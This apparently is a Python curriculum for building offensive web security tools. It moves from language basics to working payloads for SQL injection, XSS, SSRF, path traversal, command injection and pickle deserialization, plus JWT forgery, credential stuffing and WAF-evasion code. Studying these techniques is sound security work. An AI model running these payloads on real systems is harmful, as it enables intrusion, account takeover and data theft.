## 🟢 Stage 1 — Language Basics
> Mandatory. No web tool can be written without syntax fundamentals.

### Step 1 — Hello World & Program Structure
Script entry point, `print()`, shebang line, `if __name__ == "__main__"`.
```python
#!/usr/bin/env python3
print("Hello, Red Team!")

if __name__ == "__main__":
    main()
```

### Step 2 — Variables & Data Types
`int`, `float`, `bool`, `str`, `bytes`, `None`. Dynamic typing.
```python
port = 80
host = "10.0.0.1"
is_open = True
payload = b"\x41\x41\x41"
```

### Step 3 — Type Conversion
`int()`, `str()`, `bytes()`, `ord()`, `chr()`. Essential when parsing HTTP responses and raw sockets.
```python
raw = "8080"
port = int(raw)
encoded = str(port).encode()         # → b'8080'
char_val = ord("A")                   # → 65
```

### Step 4 — Operators
Arithmetic (`+`, `-`, `*`, `/`, `%`, `//`), comparison (`==`, `!=`, `>`, `<`), logical (`and`, `or`, `not`), bitwise (`&`, `|`, `^`, `~`, `<<`, `>>`).
```python
xored = 0x41 ^ 0xFF                  # bitwise XOR — used in payload encoding
flag = is_auth and is_admin
```

### Step 5 — String Operations
`f-strings`, `.split()`, `.strip()`, `.replace()`, `.startswith()`, `.encode()`, `.decode()`.
```python
url = f"http://{host}:{port}/login"
parts = "user:password".split(":")
header = "  Bearer token123  ".strip()
raw_bytes = url.encode("utf-8")
```

### Step 6 — Conditional Statements
`if`, `elif`, `else`, one-liners.
```python
if status_code == 200:
    print("[+] Login successful")
elif status_code == 403:
    print("[-] Forbidden")
else:
    print("[?] Unexpected response")
```

### Step 7 — Ternary & Short-Circuit
Compact conditionals — common in payload generation logic.
```python
method = "POST" if has_body else "GET"
target = user_input or "127.0.0.1"
```

### Step 8 — Loops: for & while
Iteration over port ranges, wordlists, URL paths.
```python
for port in range(1, 1025):
    scan(host, port)

while not connected:
    attempt_connect()
```

### Step 9 — Loop Control & Comprehensions
`break`, `continue`, list/dict/set comprehensions — concise data processing.
```python
open_ports = [p for p in range(1, 1025) if is_open(host, p)]
headers = {k: v for k, v in raw.split(": ") for raw in header_lines}
```

### Step 10 — Functions
Parameters, return values, `*args`, `**kwargs`, default values.
```python
def scan_port(host: str, port: int, timeout: float = 1.0) -> bool:
    ...

def send_request(url, **kwargs):
    ...
```

---

## 🔵 Stage 2 — Data Structures
> Every web tool stores and processes targets, payloads, cookies, headers, and results.

### Step 11 — Lists
Ordered, mutable. Wordlists, URL queues, discovered endpoints.
```python
wordlist = ["admin", "login", "dashboard", "config"]
found_paths = []
found_paths.append("/admin/panel")
found_paths.sort()
```

### Step 12 — Dictionaries
Key-value store. HTTP headers, cookies, POST bodies, JSON payloads.
```python
headers = {
    "User-Agent": "Mozilla/5.0",
    "Authorization": "Bearer eyJ...",
    "Content-Type": "application/json"
}
cookies = {"session": "abc123", "role": "user"}
```

### Step 13 — Sets
Unique elements. Deduplicating discovered subdomains, scanned URLs.
```python
discovered = set()
discovered.add("api.target.com")
discovered.add("api.target.com")   # ignored — already exists
unique_hosts = list(discovered)
```

### Step 14 — Tuples
Immutable pairs. Host-port combinations, credential pairs.
```python
targets = [("10.0.0.1", 80), ("10.0.0.2", 443)]
for host, port in targets:
    probe(host, port)
```

### Step 15 — collections Module
`deque` for efficient queuing, `defaultdict` for grouped results, `Counter` for frequency analysis.
```python
from collections import deque, defaultdict, Counter

crawl_queue = deque(["https://target.com"])
results = defaultdict(list)           # results["sqli"] = [url1, url2]
status_freq = Counter(status_codes)   # most common status codes
```

---

## 🟣 Stage 3 — Object-Oriented Programming
> Structuring tools professionally — Scanner, Fuzzer, Session, Exploit classes.

### Step 16 — Classes & Objects
Encapsulating tool logic — Scanner, Fuzzer, CrawlSession classes.
```python
class WebScanner:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.found_paths: list[str] = []
        self.session = requests.Session()
```

### Step 17 — Properties & Access Modifiers
Python convention: `_private`, `__mangled`. Properties via `@property`.
```python
class Config:
    def __init__(self):
        self._proxy = None

    @property
    def proxy(self):
        return self._proxy

    @proxy.setter
    def proxy(self, value):
        self._proxy = {"http": value, "https": value}
```

### Step 18 — Constructors & `__repr__`
Tool initialization. `__repr__` for clean debug output.
```python
class Target:
    def __init__(self, url: str, cookies: dict = None):
        self.url = url
        self.cookies = cookies or {}

    def __repr__(self):
        return f"<Target url={self.url}>"
```

### Step 19 — Inheritance
Base exploit class with specialized subclasses — SQLi, XSS, SSRF inheriting from `BaseExploit`.
```python
class BaseExploit:
    def __init__(self, target: str):
        self.target = target

    def run(self) -> str:
        raise NotImplementedError

class SQLiExploit(BaseExploit):
    def run(self) -> str:
        return self._inject("' OR 1=1--")

class SSRFExploit(BaseExploit):
    def run(self) -> str:
        return self._probe("http://169.254.169.254/")
```

### Step 20 — Abstract Classes & Interfaces
Enforcing contracts across different scanner implementations.
```python
from abc import ABC, abstractmethod

class BaseScanner(ABC):
    @abstractmethod
    def scan(self, url: str) -> list[str]: ...

    @abstractmethod
    def report(self) -> dict: ...

class DirectoryFuzzer(BaseScanner):
    def scan(self, url): ...
    def report(self): ...
```

### Step 21 — Static & Class Methods
Utility helpers — payload generators, URL parsers, encoder utilities.
```python
class PayloadUtils:
    @staticmethod
    def url_encode(payload: str) -> str:
        from urllib.parse import quote
        return quote(payload, safe="")

    @classmethod
    def from_file(cls, path: str) -> list[str]:
        with open(path) as f:
            return [line.strip() for line in f]
```

---

## 🟡 Stage 4 — Functional Python & Comprehensions
> Filter, transform, and query data — essential for processing HTTP responses and recon output.

### Step 22 — map, filter, zip
Transforming and filtering collections without loops.
```python
urls = list(map(lambda p: f"https://target.com/{p}", wordlist))
valid = list(filter(lambda u: u.status_code == 200, responses))
pairs = list(zip(usernames, passwords))
```

### Step 23 — sorted, groupby, itertools
Sorting results, grouping by status code, generating payload combinations.
```python
from itertools import product, chain
import itertools

sorted_urls = sorted(found, key=lambda x: x["status"])
combos = list(product(users, passwords))          # brute-force pairs
all_payloads = list(chain(xss_list, sqli_list))   # merge payload lists
```

### Step 24 — any, all, next, enumerate
Quick checks on scan results.
```python
has_sqli = any("error in your SQL" in r.text for r in responses)
all_up   = all(r.status_code < 500 for r in probes)
first_hit = next((r for r in results if r.status_code == 200), None)

for i, url in enumerate(targets, start=1):
    print(f"[{i}/{len(targets)}] Testing {url}")
```

---

## 🔴 Stage 5 — Essentials
> Every web tool in production relies on these.

### Step 25 — Exception Handling
Mandatory for network tooling — connection errors, timeouts, SSL failures.
```python
import requests

try:
    resp = requests.get(url, timeout=5)
    resp.raise_for_status()
except requests.exceptions.ConnectionError:
    print(f"[-] {url} — connection refused")
except requests.exceptions.Timeout:
    print(f"[-] {url} — timed out")
except requests.exceptions.HTTPError as e:
    print(f"[!] HTTP error: {e}")
finally:
    pass  # cleanup if needed
```

### Step 26 — Context Managers & `with`
File I/O and session management — automatic resource cleanup.
```python
# File operations
with open("wordlist.txt") as f:
    words = f.read().splitlines()

# Requests sessions
with requests.Session() as s:
    s.headers.update({"Authorization": "Bearer token"})
    resp = s.get(url)
```

### Step 27 — Decorators
Retry logic, timing, rate-limiting wrappers — wrapping scanner functions cleanly.
```python
import time, functools

def retry(times=3, delay=1):
    def decorator(fn):
        @functools.wraps(fn)
        def wrapper(*args, **kwargs):
            for attempt in range(times):
                try:
                    return fn(*args, **kwargs)
                except Exception as e:
                    if attempt == times - 1:
                        raise
                    time.sleep(delay)
        return wrapper
    return decorator

@retry(times=3, delay=0.5)
def fetch(url):
    return requests.get(url, timeout=5)
```

### Step 28 — Generators & Iterators
Memory-efficient wordlist streaming — loading millions of passwords without RAM explosion.
```python
def read_wordlist(path: str):
    with open(path) as f:
        for line in f:
            yield line.strip()

def url_generator(base: str, wordlist_path: str):
    for word in read_wordlist(wordlist_path):
        yield f"{base}/{word}"

# Process without loading entire file into memory
for url in url_generator("https://target.com", "big_wordlist.txt"):
    probe(url)
```

### Step 29 — Encoding & Bytes
Payload encoding, Base64, URL encoding, hashing — foundation of web exploitation.
```python
import base64, hashlib
from urllib.parse import quote, unquote

# Base64
b64 = base64.b64encode(b"whoami").decode()
raw = base64.b64decode(b64)

# URL encoding
encoded = quote("' OR 1=1--", safe="")    # → %27+OR+1%3D1--

# XOR
key = 0x41
xored = bytes([b ^ key for b in b"payload"])

# Hashing
md5 = hashlib.md5(b"password").hexdigest()
sha256 = hashlib.sha256(b"data").hexdigest()
```

### Step 30 — File I/O
Reading wordlists, writing loot, loading config — required by every tool.
```python
# Read targets / wordlists
targets = open("targets.txt").read().splitlines()
passwords = [l.strip() for l in open("rockyou.txt", encoding="latin-1")]

# Write results
with open("results.txt", "a") as f:
    f.write(f"[+] SQLi found: {url}\n")

# JSON config
import json
config = json.load(open("config.json"))
json.dump(results, open("output.json", "w"), indent=2)
```

### Step 31 — Async / Await
The most critical topic for web tools. Synchronous scan = slow. Async scan = fast.
```python
import asyncio
import aiohttp

async def probe(session: aiohttp.ClientSession, url: str):
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
            if resp.status == 200:
                print(f"[+] {url} — {resp.status}")
    except Exception:
        pass

async def fuzz(base_url: str, wordlist: list[str]):
    async with aiohttp.ClientSession() as session:
        tasks = [probe(session, f"{base_url}/{word}") for word in wordlist]
        await asyncio.gather(*tasks)

asyncio.run(fuzz("https://target.com", wordlist))
```

---

## ⚫ Stage 6 — HTTP Internals
> This is where web Red Team tooling actually begins.

### Step 32 — requests Library Deep Dive
Full control over HTTP — headers, cookies, proxies, redirects, SSL bypass.
```python
import requests

session = requests.Session()
session.verify = False                        # bypass SSL verification
session.proxies = {"http": "http://127.0.0.1:8080"}  # route through Burp

resp = session.post(
    "https://target.com/login",
    data={"username": "admin", "password": "pass"},
    headers={"X-Forwarded-For": "127.0.0.1"},
    allow_redirects=False,
    timeout=10
)
print(resp.status_code, resp.headers, resp.cookies)
```

### Step 33 — Raw HTTP with socket
Crafting malformed or non-standard HTTP requests that `requests` cannot send.
```python
import socket

raw_request = (
    b"GET /../../../../etc/passwd HTTP/1.1\r\n"
    b"Host: target.com\r\n"
    b"Connection: close\r\n\r\n"
)

s = socket.socket()
s.connect(("target.com", 80))
s.send(raw_request)
response = b""
while chunk := s.recv(4096):
    response += chunk
s.close()
print(response.decode(errors="ignore"))
```

### Step 34 — HTTP Response Parsing
Extracting tokens, forms, links, and secrets from HTML responses.
```python
from bs4 import BeautifulSoup
import re

soup = BeautifulSoup(resp.text, "html.parser")

# Extract all links
links = [a["href"] for a in soup.find_all("a", href=True)]

# Extract hidden form fields (CSRF tokens)
csrf = soup.find("input", {"name": "_token"})["value"]

# Extract emails, API keys from JS
emails = re.findall(r"[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-z]{2,}", resp.text)
api_keys = re.findall(r"['\"]([A-Za-z0-9_\-]{32,45})['\"]", resp.text)
```

### Step 35 — Authentication Mechanisms
Interacting with Basic Auth, Bearer tokens, JWTs, session cookies.
```python
import base64

# Basic Auth header
creds = base64.b64encode(b"admin:password").decode()
headers = {"Authorization": f"Basic {creds}"}

# Bearer token
headers = {"Authorization": f"Bearer {jwt_token}"}

# JWT decode (no verification — for inspection)
import json
parts = jwt_token.split(".")
payload = json.loads(base64.b64decode(parts[1] + "=="))
print(payload)   # {"sub": "user", "role": "admin", "exp": 1234567890}
```

### Step 36 — URL & Query String Manipulation
Building and mutating URLs for fuzzing, IDOR testing, path traversal.
```python
from urllib.parse import urlparse, urlencode, parse_qs, urljoin

parsed = urlparse("https://target.com/profile?id=5&page=1")
params = parse_qs(parsed.query)      # {'id': ['5'], 'page': ['1']}
params["id"] = ["1 OR 1=1"]
new_qs = urlencode(params, doseq=True)
mutated = parsed._replace(query=new_qs).geturl()

# Path traversal
for depth in range(1, 8):
    path = "../" * depth + "etc/passwd"
    url = urljoin("https://target.com/files/", path)
```

---

## 🔥 Stage 7 — Web Exploitation Techniques
> Core offensive web techniques implemented in Python.

### Step 37 — Directory & Endpoint Fuzzing
Async directory brute-forcing — finding hidden admin panels, APIs, config files.
```python
async def dir_fuzz(base_url: str, wordlist: list[str], extensions=("", ".php", ".bak")):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for word in wordlist:
            for ext in extensions:
                url = f"{base_url}/{word}{ext}"
                tasks.append(probe(session, url))
        await asyncio.gather(*tasks)
```

### Step 38 — Parameter Discovery & IDOR
Finding hidden parameters and testing Insecure Direct Object References.
```python
# Parameter name fuzzing
param_wordlist = ["id", "user_id", "uid", "pid", "file", "path", "doc"]
for param in param_wordlist:
    resp = session.get(url, params={param: "1"})
    if resp.status_code != 404:
        print(f"[+] Parameter found: {param}")

# IDOR — iterate object IDs
for obj_id in range(1, 1000):
    resp = session.get(f"{base}/api/user/{obj_id}")
    if resp.status_code == 200:
        print(f"[+] IDOR hit: /api/user/{obj_id} → {resp.json()}")
```

### Step 39 — SQL Injection Detection & Exploitation
Error-based, boolean-based, and time-based SQLi detection.
```python
error_payloads = ["'", '"', "' OR '1'='1", "' OR SLEEP(5)--", "1; DROP TABLE--"]

# Error-based detection
for payload in error_payloads:
    resp = session.get(url, params={"id": payload})
    if any(sig in resp.text for sig in ["SQL syntax", "mysql_fetch", "ORA-", "pg_query"]):
        print(f"[+] SQL error detected with payload: {payload}")

# Time-based blind
import time
start = time.time()
session.get(url, params={"id": "1' AND SLEEP(5)--"})
elapsed = time.time() - start
if elapsed >= 5:
    print("[+] Time-based SQLi confirmed")
```

### Step 40 — XSS Detection
Reflected and stored XSS probe injection and response analysis.
```python
xss_probes = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "';alert(1)//",
    "<svg onload=alert(1)>",
]

for probe in xss_probes:
    resp = session.get(url, params={"q": probe})
    if probe in resp.text:
        print(f"[+] Reflected XSS: {probe}")
    # For stored XSS — submit then visit output page and check
```

### Step 41 — SSRF Detection
Probing internal services and metadata endpoints via Server-Side Request Forgery.
```python
ssrf_targets = [
    "http://169.254.169.254/latest/meta-data/",       # AWS metadata
    "http://metadata.google.internal/computeMetadata/",# GCP metadata
    "http://127.0.0.1:22",                             # local SSH
    "http://127.0.0.1:6379",                           # Redis
    "http://0.0.0.0:8080",                             # internal app
    "file:///etc/passwd",                              # local file
]

for target in ssrf_targets:
    resp = session.post(url, json={"url": target}, timeout=5)
    if resp.status_code == 200 and len(resp.content) > 0:
        print(f"[+] Potential SSRF: {target}")
        print(resp.text[:200])
```

### Step 42 — Path Traversal & LFI
Reading local files through vulnerable file inclusion parameters.
```python
lfi_payloads = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00",               # null byte truncation (PHP < 5.4)
    "php://filter/convert.base64-encode/resource=index.php",
]

signatures = ["root:x:0:0", "daemon:", "bin/bash"]

for payload in lfi_payloads:
    resp = session.get(url, params={"file": payload})
    if any(sig in resp.text for sig in signatures):
        print(f"[+] LFI confirmed: {payload}")
        print(resp.text[:500])
```

---

## 🟠 Stage 8 — Automation & Tooling
> Building complete, scriptable tools — not one-off scripts.

### Step 43 — argparse: CLI Interface
Every real tool needs a CLI — targets, wordlists, threads, output files.
```python
import argparse

def parse_args():
    parser = argparse.ArgumentParser(description="Web Fuzzer")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-w", "--wordlist", required=True, help="Wordlist path")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Thread count")
    parser.add_argument("-o", "--output", help="Output file")
    parser.add_argument("-x", "--extensions", default=".php,.html", help="Extensions")
    parser.add_argument("--proxy", help="Proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=float, default=5.0)
    return parser.parse_args()
```

### Step 44 — Logging & Output Formatting
Structured output — color-coded results, log levels, file logging.
```python
import logging
from colorama import Fore, Style, init

init(autoreset=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
    handlers=[
        logging.FileHandler("scan.log"),
        logging.StreamHandler()
    ]
)

def log_found(url, status, length):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {url} [{status}] [{length}b]")

def log_error(msg):
    print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")
```

### Step 45 — Threading vs Asyncio
Choosing the right concurrency model for the task.
```python
# Threading — good for blocking I/O, simple tools
from concurrent.futures import ThreadPoolExecutor

with ThreadPoolExecutor(max_workers=50) as pool:
    futures = [pool.submit(probe, url) for url in url_list]

# Asyncio — best for high-concurrency network tools (1000s of requests)
async def mass_scan(urls):
    sem = asyncio.Semaphore(200)          # rate limit concurrency
    async def bounded(url):
        async with sem:
            return await probe(url)
    return await asyncio.gather(*[bounded(u) for u in urls])
```

### Step 46 — Output: JSON, CSV, HTML Reports
Structured results for integration with other tools and reporting.
```python
import json, csv

results = [{"url": u, "status": s, "length": l} for u, s, l in hits]

# JSON output
json.dump(results, open("results.json", "w"), indent=2)

# CSV output
with open("results.csv", "w", newline="") as f:
    w = csv.DictWriter(f, fieldnames=["url", "status", "length"])
    w.writeheader()
    w.writerows(results)
```

---

## 🔴 Stage 9 — Advanced Reconnaissance
> Automated information gathering — subdomains, JS secrets, API mapping.

### Step 47 — Subdomain Enumeration
DNS-based and HTTP-based subdomain discovery.
```python
import dns.resolver                    # dnspython

def resolve_subdomain(sub: str, domain: str) -> str | None:
    fqdn = f"{sub}.{domain}"
    try:
        dns.resolver.resolve(fqdn, "A")
        return fqdn
    except Exception:
        return None

async def subdomain_fuzz(domain: str, wordlist: list[str]):
    loop = asyncio.get_event_loop()
    tasks = [loop.run_in_executor(None, resolve_subdomain, w, domain) for w in wordlist]
    results = await asyncio.gather(*tasks)
    return [r for r in results if r]
```

### Step 48 — JavaScript Secret Extraction
Scraping JS files for hardcoded API keys, tokens, and endpoints.
```python
import re

patterns = {
    "AWS Key":      r"AKIA[0-9A-Z]{16}",
    "Google API":   r"AIza[0-9A-Za-z\-_]{35}",
    "JWT":          r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+",
    "Private Key":  r"-----BEGIN (?:RSA|EC|OPENSSH) PRIVATE KEY-----",
    "Bearer Token": r"['\"]Bearer [A-Za-z0-9\-._~+/]+=*['\"]",
    "Endpoint":     r"['\"/](api/v[0-9]+/[a-zA-Z0-9/_\-]+)['\"/]",
}

def extract_secrets(js_url: str, session: requests.Session):
    resp = session.get(js_url)
    found = {}
    for name, pattern in patterns.items():
        matches = re.findall(pattern, resp.text)
        if matches:
            found[name] = matches
    return found
```

### Step 49 — API Endpoint Mapping
Discovering and mapping REST API endpoints from JS bundles and Swagger docs.
```python
# Parse OpenAPI/Swagger spec
import json

def parse_swagger(url: str, session: requests.Session) -> list[dict]:
    for path in ["/swagger.json", "/api-docs", "/openapi.json", "/v2/api-docs"]:
        resp = session.get(url + path)
        if resp.status_code == 200:
            spec = resp.json()
            endpoints = []
            for route, methods in spec.get("paths", {}).items():
                for method in methods:
                    endpoints.append({"method": method.upper(), "path": route})
            return endpoints
    return []

# Extract endpoints from JS source
def extract_routes_from_js(js_text: str) -> list[str]:
    return re.findall(r'["\']/(api/[a-zA-Z0-9/_\-{}]+)["\']', js_text)
```

### Step 50 — Web Crawling & Spidering
Recursive link extraction — mapping the full attack surface.
```python
from collections import deque
from urllib.parse import urljoin, urlparse

def crawl(start_url: str, session: requests.Session, max_pages=200) -> set[str]:
    visited, queue = set(), deque([start_url])
    base = urlparse(start_url).netloc

    while queue and len(visited) < max_pages:
        url = queue.popleft()
        if url in visited:
            continue
        try:
            resp = session.get(url, timeout=5)
            visited.add(url)
            soup = BeautifulSoup(resp.text, "html.parser")
            for a in soup.find_all("a", href=True):
                abs_url = urljoin(url, a["href"])
                if urlparse(abs_url).netloc == base:
                    queue.append(abs_url)
        except Exception:
            pass
    return visited
```

---

## 🟤 Stage 10 — Evasion & Stealth
> Bypassing WAFs, IDS, and detection mechanisms.

### Step 51 — WAF Detection & Fingerprinting
Identifying Web Application Firewalls before launching attacks.
```python
waf_signatures = {
    "Cloudflare":   ["cloudflare", "__cfduid", "cf-ray"],
    "AWS WAF":      ["awswaf", "x-amzn-requestid"],
    "ModSecurity":  ["mod_security", "NOYB"],
    "Akamai":       ["akamai", "ak_bmsc"],
    "Imperva":      ["incap_ses", "visid_incap"],
}

def detect_waf(url: str, session: requests.Session) -> str | None:
    resp = session.get(url, params={"id": "' OR 1=1--"})
    all_headers = str(resp.headers).lower() + resp.text.lower()
    for waf, sigs in waf_signatures.items():
        if any(s in all_headers for s in sigs):
            return waf
    return None
```

### Step 52 — Payload Obfuscation & Encoding
Evading signature-based WAF rules with encoding tricks.
```python
from urllib.parse import quote

def obfuscate_sqli(payload: str) -> list[str]:
    variants = [
        payload,
        payload.replace(" ", "/**/"),           # comment substitution
        payload.replace(" ", "%20"),             # URL encode spaces
        payload.replace(" ", "+"),
        payload.upper(),
        payload.lower(),
        quote(payload),                          # full URL encode
        quote(quote(payload)),                   # double encode
        payload.replace("'", "%27").replace(" ", "%20"),
    ]
    return variants

def obfuscate_xss(payload: str) -> list[str]:
    return [
        payload,
        payload.replace("<", "%3C").replace(">", "%3E"),
        payload.replace("script", "scRiPt"),     # case variation
        payload.replace("script", "scr\x00ipt"), # null byte
        payload.replace("alert", "confirm"),
        payload.replace("alert(1)", "alert`1`"),  # template literals
    ]
```

### Step 53 — Request Fingerprint Evasion
Rotating user agents, headers, timing — avoiding bot detection.
```python
import random, time

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
]

def build_stealth_session(proxy: str = None) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent": random.choice(USER_AGENTS),
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Referer": "https://www.google.com/",
    })
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

def jitter_request(fn, min_ms=200, max_ms=1500):
    result = fn()
    time.sleep(random.uniform(min_ms, max_ms) / 1000)
    return result
```

### Step 54 — Custom HTTP Client (urllib3)
Low-level HTTP for crafting non-standard requests that bypass framework-level filters.
```python
import urllib3

urllib3.disable_warnings()
http = urllib3.PoolManager(
    cert_reqs="CERT_NONE",
    num_pools=50,
    maxsize=20,
    retries=urllib3.Retry(3, backoff_factor=0.5)
)

# Non-standard method (for bypass testing)
resp = http.request(
    "FUZZ",
    "https://target.com/api/admin",
    headers={"Content-Type": "application/json"},
    body=b'{"role":"admin"}'
)

# HTTP/1.0 downgrade (sometimes bypasses WAF)
resp = http.request("GET", url, headers={"Connection": "close"}, version=10)
```

---

## 🔵 Stage 11 — Post-Exploitation via Web
> Leveraging web vulnerabilities for deeper access.

### Step 55 — Command Injection & RCE
Exploiting command injection vulnerabilities to achieve remote code execution.
```python
cmd_payloads = [
    "; id",
    "| id",
    "& id",
    "|| id",
    "&& id",
    "`id`",
    "$(id)",
    "\n/usr/bin/id",
]

def test_cmdi(url: str, param: str, session: requests.Session):
    for payload in cmd_payloads:
        resp = session.get(url, params={param: "test" + payload})
        if "uid=" in resp.text:
            print(f"[+] RCE via command injection: {payload}")
            print(resp.text[:300])
            return payload
    return None
```

### Step 56 — Deserialization Attacks
Generating and detecting insecure deserialization vulnerabilities.
```python
import pickle, base64, os

# Python pickle gadget — PoC only
class RCEPayload:
    def __reduce__(self):
        return (os.system, ("id",))

payload = base64.b64encode(pickle.dumps(RCEPayload())).decode()
print(f"[*] Pickle payload: {payload}")

# PHP serialization probes
php_probes = [
    'O:8:"stdClass":0:{}',
    'O:4:"User":1:{s:4:"role";s:5:"admin";}',
]

# Java deserialization marker
java_marker = b"\xac\xed\x00\x05"   # Java serialized object magic bytes

def detect_java_deser(resp_bytes: bytes) -> bool:
    return resp_bytes.startswith(java_marker)
```

### Step 57 — JWT Attacks
Exploiting JWT vulnerabilities — algorithm confusion, none algorithm, secret brute-force.
```python
import jwt, json, base64

def jwt_none_attack(token: str) -> str:
    """Strip signature — 'none' algorithm attack"""
    header, payload, _ = token.split(".")
    header_decoded = json.loads(base64.b64decode(header + "=="))
    header_decoded["alg"] = "none"
    new_header = base64.urlsafe_b64encode(
        json.dumps(header_decoded).encode()
    ).rstrip(b"=").decode()
    return f"{new_header}.{payload}."

def brute_jwt_secret(token: str, wordlist: list[str]) -> str | None:
    for secret in wordlist:
        try:
            jwt.decode(token, secret, algorithms=["HS256"])
            return secret
        except jwt.InvalidSignatureError:
            continue
    return None
```

### Step 58 — Credential Stuffing & Brute Force
Automated credential testing with rate-limit evasion.
```python
async def credential_stuff(
    login_url: str,
    credentials: list[tuple],
    success_indicator: str,
    delay_ms: int = 500
):
    async with aiohttp.ClientSession() as session:
        for username, password in credentials:
            async with session.post(
                login_url,
                data={"username": username, "password": password},
                allow_redirects=False
            ) as resp:
                body = await resp.text()
                if success_indicator in body or resp.status == 302:
                    print(f"[+] Valid credentials: {username}:{password}")
                await asyncio.sleep(delay_ms / 1000 + random.uniform(0, 0.3))
```

---

## ⚙️ Stage 12 — Tool Architecture
> Building production-quality, modular offensive tools.

### Step 59 — Plugin Architecture
Modular scanner where each check is a self-contained plugin.
```python
from abc import ABC, abstractmethod

class ScanPlugin(ABC):
    name: str = ""
    severity: str = "info"

    @abstractmethod
    def check(self, url: str, session: requests.Session) -> list[dict]: ...

class SQLiPlugin(ScanPlugin):
    name = "sql-injection"
    severity = "critical"
    def check(self, url, session): ...

class XSSPlugin(ScanPlugin):
    name = "xss"
    severity = "high"
    def check(self, url, session): ...

class Scanner:
    def __init__(self):
        self.plugins: list[ScanPlugin] = []

    def register(self, plugin: ScanPlugin):
        self.plugins.append(plugin)

    def run(self, url: str, session: requests.Session):
        return {p.name: p.check(url, session) for p in self.plugins}
```

### Step 60 — Configuration & Environment
Professional tool configuration — YAML/ENV-based, no hardcoded values.
```python
import os
import yaml

# Environment variables
C2_URL  = os.getenv("C2_URL", "http://127.0.0.1")
API_KEY = os.getenv("API_KEY", "")

# YAML config
with open("config.yaml") as f:
    config = yaml.safe_load(f)

target  = config["target"]["url"]
threads = config["scan"]["threads"]
timeout = config["scan"]["timeout"]

# config.yaml structure:
# target:
#   url: https://target.com
# scan:
#   threads: 50
#   timeout: 5.0
#   extensions: [.php, .bak, .old]
```

---
